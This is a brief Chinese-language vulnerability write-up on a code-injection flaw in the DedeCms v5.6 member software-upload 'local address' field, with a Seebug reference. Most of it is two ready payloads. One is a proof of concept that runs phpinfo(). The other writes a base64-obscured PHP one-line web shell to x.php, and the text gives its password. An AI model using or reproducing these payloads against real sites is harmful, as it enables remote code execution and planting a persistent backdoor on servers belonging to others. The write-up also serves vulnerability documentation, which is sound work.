# DedeCms v5.6 嵌入恶意代码执行漏洞

## 漏洞简介

在上传软件的地方，对本地地址没有进行有效的验证，可以被恶意利用。

## 影响版本

DedeCms v5.6

## 复现

注册会员，上传软件：本地地址中填入如下：

### POC

```
a{/dede:link}{dede:toby57 name\="']=0;phpinfo();//"}x{/dede:toby57}，
```

发表后查看或修改即可执行。

### EXP

```
a{/dede:link}{dede:toby57 name\="']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//"}x{/dede:toby57}
```

生成x.php 密码：xiao直接生成一句话。



## 参考

知道创宇：https://www.seebug.org/vuldb/ssvid-20352